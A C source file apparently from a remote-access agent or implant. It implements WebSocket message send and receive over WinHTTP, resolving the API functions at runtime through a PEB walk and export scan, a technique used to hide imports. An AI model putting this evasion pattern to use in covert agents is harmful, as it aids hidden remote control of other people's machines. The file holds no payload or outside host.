/* transport.c - the WebSocket pipe (see transport.h).
 */

#include "transport.h"
#include "types.h"
#include "memory.h"
#include "winhttp_api.h"

/* Runtime-resolved WinHttpWebSocketSend (winhttp_api.h). Zero-initialized
 * in .bss - legal until Phase 5 kills statics. The NULL member doubles as
 * the "not resolved yet" flag: the first ws_send pays the PEB walk +
 * export scan once; every later send is a single NULL check. This beats
 * re-running the Ctor on every call (the shell.c pattern), which would
 * re-walk the loader list for every reply this agent sends. */
static WINHTTP_API ws_api;

/* Send one binary reply. Returns the WinHTTP error code (0 = success). */
DWORD ws_send(HINTERNET socket, const void *data, DWORD length)
{
    if (ws_api.WinHttpWebSocketSend == NULL && !WINHTTP_API_Ctor(&ws_api))
        return ERROR_MOD_NOT_FOUND;   /* nonzero = failure per the family's
                                         direct-error-code contract */

    return ws_api.WinHttpWebSocketSend(socket,
                                       WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
                                       (PVOID)data, length);
}

/* Receive and assemble one complete WebSocket message (see transport.h). */
DWORD ws_receive(HINTERNET socket, incoming_message *msg, BOOL *closed)
{
    MemoryZero(msg, sizeof(*msg));
    *closed = FALSE;

    /* Same lazy-ctor contract as ws_send: the static table starts NULL,
     * the first receive pays the bootstrap once. Calling through the
     * NULL member is a segfault - this guard is load-bearing. */
    if (ws_api.WinHttpWebSocketReceive == NULL && !WINHTTP_API_Ctor(&ws_api))
        return ERROR_MOD_NOT_FOUND;

    for (;;) {
        static unsigned char fragment[RECV_FRAGMENT_SIZE];
        DWORD got = 0;
        WINHTTP_WEB_SOCKET_BUFFER_TYPE type;

        DWORD err = ws_api.WinHttpWebSocketReceive(socket, fragment,
                                                   sizeof(fragment), &got, &type);
        if (err != NO_ERROR)
            return err;

        if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) {
            *closed = TRUE;
            return NO_ERROR;
        }

        if (got > 0) {
            if (msg->length + got <= MAX_MESSAGE_SIZE) {
                MemoryCopy(msg->data + msg->length, fragment, got);
                msg->length += got;
            } else {
                msg->truncated = TRUE;   /* keep the first MAX_MESSAGE_SIZE */
            }
        }

        if (type == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE ||
            type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) {
            msg->type = type;
            return NO_ERROR;             /* message complete */
        }
    }
}
